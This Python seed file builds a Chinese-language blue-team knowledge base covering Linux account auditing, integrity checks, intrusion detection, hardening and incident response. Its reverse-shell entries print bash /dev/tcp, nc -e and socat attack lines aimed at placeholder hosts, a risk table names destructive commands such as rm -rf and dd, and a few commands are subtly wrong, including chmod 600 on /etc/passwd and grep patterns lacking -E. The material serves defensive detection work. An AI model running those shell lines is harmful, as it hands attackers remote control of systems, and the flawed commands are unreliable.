"""知识库预置数据 — 蓝队安全运维完整知识体系.

覆盖: 权限隔离 · 文件完整性 · 高危行为排查 · 开源工具 · 防御拦截
运行: PYTHONPATH=. .venv/bin/python -m security_agent.knowledge.gitee_wiki.seed_knowledge
"""

from security_agent.knowledge.gitee_wiki.models import WikiDoc
from security_agent.knowledge.gitee_wiki.indexer import WikiIndexer, save_cache

PRESET_DOCS = [
    # ============================================================
    # 模块1: 账号与权限隔离
    # ============================================================
    WikiDoc(category="账号与权限隔离", tags=["账号审计","UID0","提权检测","sudo"],
            title="账号权限审计 — UID0/影子账号/空密码",
            content="""## 用途
发现特权账号、影子账号、异常 sudo 授权，防范账号劫持与后门。

## 操作示例
```bash
cat /etc/passwd                                    # 查看所有账号
awk -F: '$3==0 {print $1}' /etc/passwd             # UID=0 超级账号
cat /etc/shadow                                     # 密码哈希状态
awk -F: '$2=="" {print $1}' /etc/shadow            # 空密码账号
id                                                  # 当前用户权限/所属组
cat /etc/sudoers && ls /etc/sudoers.d/              # sudo 授权列表
```

## 风险等级: 🔴 严重高危
多个 UID=0 账号、普通用户 sudo ALL → 大概率账号劫持/后门。

## 防御要点
- 定期审计 /etc/passwd 与 /etc/shadow
- 移除非必要的 sudo ALL 授权
- 空密码账号必须锁定或删除"""),

    WikiDoc(category="账号与权限隔离", tags=["账号锁定","usermod","userdel","登录限制"],
            title="账号锁定与隔离 — 阻断可疑登录",
            content="""## 用途
锁定可疑账号、删除后门账号、禁止远程登录，实现权限隔离。

## 操作示例
```bash
usermod -L 用户名              # 锁定账号禁止登录
usermod -U 用户名              # 解锁
userdel -r 用户名              # 彻底删除账号及家目录
usermod -s /sbin/nologin 用户名 # 禁止SSH登录(仅本地)
```

## 风险等级: 🟠 高风险
适用于发现匿名账号、测试账号、异常登录记录时紧急处置。

## 防御要点
- 配合 last/w 命令发现异常登录后立即锁定
- 删除前先备份其 home 目录取证"""),

    WikiDoc(category="账号与权限隔离", tags=["文件权限","chmod","chown","ls"],
            title="文件权限管控 — chmod/chown 权限收紧",
            content="""## 用途
收紧关键配置文件的读写执行权限，防止越权修改。

## 操作示例
```bash
ls -lR /etc/ssh                  # 递归查看目录权限
chmod 600 /etc/passwd /etc/shadow # 关键文件强制只读
chmod 700 /root /home/可疑用户    # 限制目录访问
chown root:root /etc/sudoers      # 剥夺普通用户属主权
```

## 风险等级: 🟡 中风险
权限过宽（777/666）是常见配置缺陷，易被利用。

## 防御要点
- 定期执行 `find / -perm -777 -type f` 排查
- 关键目录权限 ≤755，关键文件权限 ≤644"""),

    WikiDoc(category="账号与权限隔离", tags=["SUID","SGID","提权","sticky"],
            title="特殊权限排查 — SUID/SGID/全局可写",
            content="""## 用途
发现可被提权利用的 SUID/SGID 文件，是最重要的权限审计项。

## 操作示例
```bash
find / -perm -4000 -type f 2>/dev/null   # 全盘 SUID 文件
find / -perm -2000 -type f 2>/dev/null   # 全盘 SGID 文件
find / -perm -002 -type d 2>/dev/null    # 全局可写目录
```

## 风险等级: 🔴 严重高危
/bin、/usr/bin 下非标准二进制文件带 SUID → 几乎确定被植入后门。

## 防御要点
- 非必要不设 SUID/SGID
- 全局可写目录加粘滞位: `chmod +t /tmp`"""),

    WikiDoc(category="账号与权限隔离", tags=["chattr","不可变","防篡改","文件锁定"],
            title="文件不可变锁定 — chattr 防篡改",
            content="""## 用途
最强制权限隔离——锁定后 root 也无法删除修改，保护核心配置。

## 操作示例
```bash
chattr +i /etc/passwd           # 锁定，禁止增删改
chattr +i /etc/shadow
chattr +i /etc/sudoers
chattr -i 文件名                # 解除锁定
lsattr 文件名                   # 查看特殊属性
```

## 风险等级: 🟡 中风险（防护用）
推荐防护: /etc/passwd, /etc/shadow, /etc/sudoers, 系统启动脚本。

## 防御要点
- 锁定前确保备份
- 配合 aide 做完整性双重校验"""),

    WikiDoc(category="账号与权限隔离", tags=["会话隔离","w","pkill","ulimit"],
            title="会话与进程权限隔离 — 阻断横向扩散",
            content="""## 用途
踢出可疑会话、限制进程资源，防止横向扩散与资源耗尽。

## 操作示例
```bash
w                                    # 查看所有登录会话
pkill -t pts/0                       # 踢出可疑终端
ulimit -n 1024                       # 限制进程最大文件句柄
ulimit -u 50                         # 限制最大进程数
```

## 风险等级: 🟡 中风险
陌生 IP 的 SSH 会话 + 异常进程 → 立即踢出 + 限制。

## 防御要点
- 配合 who / last 做登录审计
- 生产环境设置合理的 ulimit 限制"""),

    # ============================================================
    # 模块2: 文件完整性校验
    # ============================================================
    WikiDoc(category="文件完整性校验", tags=["哈希","md5sum","sha256sum","防篡改"],
            title="原生哈希校验 — md5sum/sha256sum 批量比对",
            content="""## 用途
对系统关键文件生成哈希清单，事后比对发现篡改/木马替换。

## 操作示例
```bash
# 安全状态下生成基准哈希清单
find /bin /sbin /usr/bin /usr/sbin -type f | xargs sha256sum > system_hash.txt

# 事后校验
sha256sum -c system_hash.txt | grep -v "OK"

# 单文件校验
sha256sum /bin/ls
md5sum /bin/ps
```

## 风险等级: 🔴 严重高危
ls/ps/netstat/bash 哈希不一致 → 系统命令被替换为木马。

## 防御要点
- 安全状态立刻生成哈希清单
- 存入只读介质或 chattr 锁定清单文件"""),

    WikiDoc(category="文件完整性校验", tags=["AIDE","Tripwire","完整性","开源工具"],
            title="AIDE — 开源文件完整性检测",
            content="""## 用途
业界标准开源完整性工具，监控文件哈希/权限/属主/大小/修改时间变化。

## 安装
```bash
apt install aide -y
```

## 操作示例
```bash
aide --init          # 初始化基准库（安全状态）
aide --check         # 比对文件变动
```

## 风险等级: 🟠 高风险（检测项）
适合服务器常态化巡检。Tripwire 为备选方案(规则更灵活但配置复杂)。

## 防御要点
- 首次部署后在干净环境执行 --init
- 定期 cron 执行 --check + 告警通知"""),

    WikiDoc(category="文件完整性校验", tags=["rkhunter","rootkit","后门查杀","chkrootkit"],
            title="rkhunter + chkrootkit — Rootkit 后门查杀",
            content="""## 用途
专门检测内核级、进程隐藏后门及被替换的系统命令。

## 安装与使用
```bash
apt install rkhunter chkrootkit -y
rkhunter --update              # 更新特征库
rkhunter --check               # 全盘扫描
chkrootkit                      # 轻量快速扫描
```

## 风险等级: 🔴 严重高危
检测到隐藏进程/内核后门/LD_PRELOAD劫持 → 系统已被深度控制。

## 防御要点
- rkhunter 与 chkrootkit 双工具互补
- 配合 `ldd /bin/ls` 检查动态库劫持
- 检测到 rootkit 后从已知干净介质重建系统"""),

    WikiDoc(category="文件完整性校验", tags=["ldd","rpm","动态库","库劫持"],
            title="动态库/内核文件校验 — ldd/rpm 完整性",
            content="""## 用途
检测动态链接库劫持和系统包完整性——攻击者常用手段。

## 操作示例
```bash
ldd /bin/ls                 # 查看依赖库，检查异常路径
rpm -Va                     # 校验所有rpm包完整性(CentOS/RHEL)
debsums -c                  # Debian/Ubuntu 包校验(需安装 debsums)
```

## 风险等级: 🔴 严重高危
依赖库路径异常或库文件哈希不符 → 大概率 lib 劫持后门。

## 防御要点
- 重点检查 libc.so、libpthread.so 等核心库
- 异常库文件立即隔离 + 从干净源恢复"""),

    # ============================================================
    # 模块3: 高危恶意行为检索
    # ============================================================
    WikiDoc(category="高危恶意行为检索", tags=["反弹shell","远控","nc","/dev/tcp","SOCAT"],
            title="🔴 反弹Shell 检测 — 远控核心入口",
            content="""## 用途
检测攻击者最常用的远程控制手段——反弹Shell。

## 恶意特征
```bash
bash -i >& /dev/tcp/恶意IP/端口 0>&1
nc 恶意IP 端口 -e /bin/bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:恶意IP:端口
```

## 检测命令
```bash
grep -r "/dev/tcp" /tmp /home /etc 2>/dev/null
ps aux | grep -E "bash -i|nc.*bash|socat"
ss -tulnp | grep -v 127.0.0.1               # 外联端口
```

## 风险等级: 🔴 严重高危
出现陌生 nc/socat 进程 + 外联陌生 IP → 99% 已被远控。

## 防御要点
- 限制 nc/socat 执行权限: `chmod 700 /usr/bin/nc`
- iptables 默认 DROP，只开放必要端口"""),

    WikiDoc(category="高危恶意行为检索", tags=["定时任务","cron","持久化","后门"],
            title="🔴 定时任务后门 — 持久化恶意代码",
            content="""## 用途
排查 cron 被植入周期性执行的恶意脚本或外联任务。

## 检测命令
```bash
crontab -l                                          # 当前用户
cat /etc/crontab                                     # 系统级
ls -l /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
grep -r "curl|wget|bash" /etc/cron* 2>/dev/null     # 恶意外联
systemctl list-timers                                # systemd 定时器
```

## 风险等级: 🔴 严重高危
非管理员创建的 cron 任务 + 指向外网 IP/未知脚本 → 持久化后门。

## 防御要点
- 限制 crontab 使用: `echo "root" >> /etc/cron.allow`
- 定期审计 crontab 变更"""),

    WikiDoc(category="高危恶意行为检索", tags=["恶意下载","wget","curl","木马","/tmp"],
            title="🟠 恶意文件下载与临时目录木马",
            content="""## 用途
检测通过 wget/curl 下载木马程序及 /tmp 目录中的恶意可执行文件。

## 检测命令
```bash
grep -r "wget|curl" /var/log /tmp /home 2>/dev/null
history | grep -E "wget|curl"
find /tmp /var/tmp -type f -mmin -60 -exec ls -l {} \;     # 1h内新增
find /tmp -name "*.sh" -o -name "*.elf"                     # 脚本/可执行
```

## 风险等级: 🟠 高风险
/tmp 是木马重灾区——发现可执行文件 + 外联地址 = 恶意下载。

## 防御要点
- /tmp 挂载 noexec: `mount -o remount,noexec /tmp`
- 限制普通用户 wget/curl: `chmod 700 /usr/bin/wget`"""),

    WikiDoc(category="高危恶意行为检索", tags=["外联检测","ss","netstat","数据窃取"],
            title="🟠 端口外联与异常网络连接",
            content="""## 用途
检测异常外网连接——木马外联/数据窃取/远控回连。

## 检测命令
```bash
ss -tulnp | grep -v 127.0.0.1         # 监听端口(排除回环)
ss -tanp state established             # 已建立的TCP连接
netstat -antp                           # 进程级网络连接
nethogs                                 # 按进程统计流量(需安装)
```

## 风险等级: 🟠 高风险
PID 对应的程序路径在 /tmp 或 ~/Downloads → 恶意程序外联。

## 防御要点
- 配合 `lsof -i` 确认进程路径
- iptables 限制出站连接白名单"""),

    WikiDoc(category="高危恶意行为检索", tags=["数据窃取","打包","tar","zip","幽灵文件"],
            title="🟡 数据窃取与幽灵文件",
            content="""## 用途
检测批量打包/拷贝行为及无主幽灵文件。

## 检测命令
```bash
history | grep -E "tar|cp|zip"                         # 打包窃取
find / -name "*.tar*" -o -name "*.zip" -size +10M      # 大压缩包
find / -nouser -nogroup 2>/dev/null                     # 幽灵文件
find / -name ".*" -type f -size +1M 2>/dev/null         # 隐藏大文件
```

## 风险等级: 🟡 中风险
异常时段大量打包 + 无主文件 = 数据窃取或残留木马。

## 防御要点
- 审计 history 异常时间段的文件操作
- 幽灵文件立即隔离分析"""),

    # ============================================================
    # 模块4: 高危系统命令管控
    # ============================================================
    WikiDoc(category="高危系统命令管控", tags=["rm","dd","chmod","mount","破坏"],
            title="⚫ 高危系统命令 — rm/dd/chmod/mount 管控",
            content="""## 用途
识别和隔离可被滥用的系统高危命令，防止误删/恶意破坏。

## 风险命令与隔离方案
| 命令 | 风险 | 隔离方式 |
|------|------|----------|
| `rm -rf /path` | 误删/恶意删库 | sudoers 限制 + i 属性保护 |
| `dd if=源 of=目标` | 擦除磁盘/植入后门 | 移除普通用户执行权限 |
| `chmod -R 777 /` | 批量下放权限 | sudoers 限制 |
| `mount 设备 挂载点` | 挂载恶意分区 | 限制 mount 权限 |

## 隔离命令
```bash
chmod 700 /bin/rm /bin/dd       # 限制高危命令使用权
sudoers: 禁止普通用户执行       # /etc/sudoers 精细控制
chattr +i /关键目录              # 锁定防删除
```

## 风险等级: 🔴 严重高危
rm -rf /、dd 直接毁数据；chmod -R 777 全系统权限崩坏。

## 防御要点
- 生产环境必须 sudoers 限制
- 关键数据定期备份 + chattr 锁定"""),

    # ============================================================
    # 模块5: 防御与拦截
    # ============================================================
    WikiDoc(category="防御与拦截", tags=["iptables","防火墙","封禁IP","ufw"],
            title="iptables/ufw — IP封禁与端口拦截",
            content="""## 用途
快速封禁攻击IP、限制端口访问、配置防火墙策略。

## 操作示例
```bash
# 封禁攻击IP
iptables -A INPUT -s 攻击IP -j DROP

# 限制SSH连接频率(防爆破)
iptables -A INPUT -p tcp --dport 22 -m recent --set -m recent --update --seconds 60 --hitcount 3 -j DROP

# 默认策略
iptables -P INPUT DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# ufw 简化版
ufw default deny incoming
ufw allow 22/tcp
ufw enable
```

## 风险等级: 🟠 高风险（防御操作）
iptables 必须配置默认 DROP + 白名单开放。

## 防御要点
- 规则变更前先备份: `iptables-save > backup.rules`
- 禁止 0.0.0.0 绑定高危端口"""),

    WikiDoc(category="防御与拦截", tags=["fail2ban","自动封禁","SSH","暴力破解"],
            title="fail2ban — 自动防暴力破解拦截",
            content="""## 用途
监控日志，自动用 iptables 封禁多次失败登录的 IP。

## 安装与配置
```bash
apt install fail2ban -y
cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
# 编辑 jail.local 启用 [sshd] 和 [nginx-http-auth]
systemctl start fail2ban && systemctl enable fail2ban
```

## 检测状态
```bash
fail2ban-client status          # 总体状态
fail2ban-client status sshd     # SSH 封禁数
```

## 风险等级: 🟡 中风险（防御工具）
推荐度: ⭐⭐⭐⭐⭐ 必装，SSH/Web/FTP 全场景覆盖。

## 防御要点
- ban time ≥ 3600 秒
- 配合 iptables 白名单避免误封"""),

    WikiDoc(category="防御与拦截", tags=["SSH配置","sshd_config","加固","PortKnocking"],
            title="SSH 安全加固 — 端口/密钥/登录限制",
            content="""## 用途
加固 SSH 服务，降低暴力破解和未授权访问风险。

## 操作示例
```bash
# 修改默认端口
sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
# 禁止 root 登录
sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
# 禁止空密码
sed -i 's/#PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config
# 仅允许密钥登录
sed -i 's/#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd
```

## 风险等级: 🟠 高风险（安全加固）
默认 22 端口 + root 密码登录 = 随时被爆破。

## 防御要点
- 改端口 + 禁 root + 密钥登录 = 三重加固
- 配合 fail2ban 自动封禁"""),

    # ============================================================
    # 模块6: 开源工具
    # ============================================================
    WikiDoc(category="开源安全工具", tags=["lynis","安全审计","自动化","扫描"],
            title="lynis — 开源系统安全审计工具",
            content="""## 用途
一键扫描账号/权限/SUID/防火墙/配置漏洞，输出风险项+加固建议。

## 安装
```bash
apt install lynis -y       # Debian/Ubuntu
yum install lynis -y        # CentOS/RHEL
```

## 操作示例
```bash
lynis audit system                                     # 完整审计
lynis audit system --tests accounts,permissions       # 专项扫描
```

## 风险等级: 检测工具
推荐度: ⭐⭐⭐⭐⭐（必收录，自动化巡检首选）

## 防御要点
- 定期 cron 执行 + 输出报告
- 批量发现弱口令/异常SUID/sudo权限滥用"""),

    WikiDoc(category="开源安全工具", tags=["netstat替代","ss","htop","nethogs","流量"],
            title="进程/流量排查 — htop + nethogs + iftop",
            content="""## 用途
交互式进程监控 + 按进程统计流量 + 实时IP间流量监控。

## 安装
```bash
apt install htop nethogs iftop -y
```

## 操作示例
```bash
htop                          # 交互式进程(CPU/内存/IO)
nethogs                        # 按进程统计流量
iftop                          # 实时IP流量查看
```

## 风险等级: 🟠 高风险（检测场景）
使用场景: nethogs 发现某进程大量外传数据 → 木马外联。

## 防御要点
- 排查时三个工具联动: htop 找异常进程 → nethogs 看流量 → iftop 查IP"""),

    WikiDoc(category="开源安全工具", tags=["日志分析","lnav","ripgrep","检索","rg"],
            title="日志增强工具 — lnav + ripgrep",
            content="""## 用途
替代原生 cat/grep 的增强日志查看和高速检索工具。

## 安装
```bash
apt install lnav -y
# ripgrep
apt install ripgrep -y        # 或 cargo install ripgrep
```

## 操作示例
```bash
lnav /var/log/auth.log                    # 彩色高亮+时间线跳转
rg "Failed password" /var/log             # 比grep快数倍
rg -l "reverse_shell" /home /tmp          # 快速定位
```

## 风险等级: 辅助工具
推荐度: ⭐⭐⭐⭐⭐ 必装（大规模检索首选）

## 防御要点
- lnav 适合交互式日志分析
- ripgrep 适合脚本化批量搜索"""),

    WikiDoc(category="开源安全工具", tags=["socat","nc","攻防","特征"],
            title="socat/nc — 攻防双重用途工具特征库",
            content="""## 用途
合法运维可做端口转发/调试，但被滥用即反弹Shell/远控。需收录正常用法+恶意特征。

## 正常用法
```bash
socat TCP-LISTEN:8080,fork TCP:localhost:80    # 端口转发
nc -lvp 9999 > received_file                    # 文件接收
```

## 恶意特征(出现即高危)
```bash
socat exec:'bash -li',pty tcp:外网IP:端口       # 反弹Shell
nc 外网IP 端口 -e /bin/bash                      # 远控后门
```

## 检测命令
```bash
ps aux | grep -E "socat|nc"
ss -tulnp | grep -E ":(4444|5555|6666|7777|8888|9999)"
```

## 风险等级: 🔴 严重高危
出现陌生 nc/socat 进程 + 外联非标准端口 → 大概率远控。

## 防御要点
- 移除/限制 nc socat 执行权限
- iptables 监控出站连接到非标准端口"""),

    WikiDoc(category="开源安全工具", tags=["权限审计","pscan","sudo-log","sudo日志"],
            title="pscan + sudo-log — 端口权限与 sudo 操作审计",
            content="""## 用途
排查高权限监听端口异常绑定，追溯提权操作记录。

## 操作示例
```bash
# 端口+权限联合扫描 (pscan)
pscan

# sudo 日志溯源
cat /var/log/auth.log | grep sudo
journalctl -u sudo

# 查看 sudo 操作记录
sudoreplay -l
```

## 风险等级: 🟡 中风险（审计用）
推荐度: ⭐⭐⭐⭐（运维审计必备，拓展收录）

## 防御要点
- 定期审计 sudo 日志
- 异常时段 + 异常命令 = 立即排查"""),

    WikiDoc(category="应急响应", tags=["入侵排查","攻击链","溯源","安全检查清单"],
            title="Linux 入侵溯源完整检查清单",
            content="""## 检查项目(按顺序)

### 1. 账户
```bash
last -20; cat /etc/passwd; cat /etc/shadow; w
```

### 2. 进程
```bash
ps auxf --sort=-%cpu; pstree -p | grep -v systemd | head -30
```

### 3. 网络
```bash
ss -tlnp; ss -tanp state established
```

### 4. 文件
```bash
find / -mtime -1 -type f 2>/dev/null | head -20
find /tmp -name "*.sh" -o -name "*.elf"
```

### 5. 定时任务
```bash
crontab -l; cat /etc/crontab; systemctl list-timers
```

### 6. 启动项
```bash
systemctl list-unit-files | grep enabled
```

### 7. 内核模块
```bash
lsmod | grep -vE '^Module'; cat /proc/modules | head -20
```

## 风险等级: 🔴 严重高危
上述任意项发现异常 → 服务器已被入侵，进入应急响应流程。"""),

    WikiDoc(category="应急响应", tags=["SSH","暴力破解","fail2ban","日志分析"],
            title="SSH 暴力破解应急响应流程",
            content="""## 检测方法
```bash
grep 'Failed password' /var/log/auth.log | tail -30
grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
who; w
```

## 处置步骤
1. 封禁攻击IP: `iptables -A INPUT -s <IP> -j DROP`
2. 安装 fail2ban: `apt install fail2ban -y`
3. 配置 jail: /etc/fail2ban/jail.local 中启用 [sshd]
4. 修改 SSH 端口: Port 2222
5. 禁止 root 登录: PermitRootLogin no

## 风险等级: 🟠 高风险"""),

    WikiDoc(category="应急响应", tags=["webshell","入侵","PHP木马","YARA"],
            title="WebShell 检测与清除",
            content="""## 检测方法
```bash
find /var/www -name '*.php' -mtime -3
grep -r 'eval' /var/www --include='*.php' | head -20
grep -r 'base64_decode' /var/www --include='*.php' | head -20
find /var/www -name '.*' -type f       # 隐藏文件
```

## 清除步骤
1. 隔离: `mv suspicious.php /quarantine/`
2. 检查 crontab: `crontab -l`
3. 扫描全站: 使用 yara 规则 + chkrootkit
4. 修复: 更新 CMS/框架，改密码

## 风险等级: 🔴 严重高危"""),
]


def seed():
    print(f"正在写入 {len(PRESET_DOCS)} 篇预置知识...")
    save_cache(PRESET_DOCS)
    indexer = WikiIndexer()
    indexer.build_index(PRESET_DOCS)
    stats = indexer.status
    print(f"✅ 索引构建完成: {stats['doc_count']} 篇, {stats['vocab_size']} 词汇")
    cats = indexer.list_categories()
    for c in cats:
        print(f"   {c['category']}: {c['doc_count']} 篇")

if __name__ == "__main__":
    seed()
